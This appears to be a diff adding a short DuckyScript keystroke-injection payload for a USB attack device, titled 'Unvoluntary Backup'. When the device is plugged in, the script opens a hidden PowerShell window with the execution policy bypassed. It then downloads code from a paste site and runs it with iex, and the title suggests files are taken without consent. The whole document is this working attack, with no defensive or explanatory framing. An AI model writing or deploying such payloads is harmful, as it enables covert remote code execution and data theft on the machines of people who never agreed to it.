@@ -1,0 +1,7 @@
+REM     Title: Unvoluntary Backup
+
+DELAY 2000
+GUI
+DELAY
+STRING powershell -w h -NoP -NonI -Ep unrestricted "iex((iwr -UseBasicParsing https://www.klgrth.io/paste/3qsz5/raw).content)" 
+ENTER
